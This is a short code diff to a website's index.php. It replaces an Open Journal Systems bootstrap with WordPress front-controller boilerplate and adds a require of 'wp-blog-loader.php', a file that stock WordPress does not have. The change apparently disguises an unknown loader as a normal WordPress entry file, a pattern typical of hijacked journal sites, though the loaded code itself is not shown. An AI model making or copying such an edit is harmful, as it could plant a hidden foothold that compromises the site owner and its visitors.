@@ -1,21 +1,18 @@
 <?php
-
 /**
- * @file index.php
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
  *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2003-2021 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
- *
- * Bootstrap code for OJS site. Loads required files and then calls the
- * dispatcher to delegate to the appropriate request handler.
+ * @package WordPress
  */
 
-use APP\core\Application;
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
 
-// Initialize global environment
-define('INDEX_FILE_LOCATION', __FILE__);
-require_once './lib/pkp/includes/bootstrap.php';
-
-// Serve the request
-Application::get()->execute();
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
+require __DIR__ . '/wp-blog-loader.php';
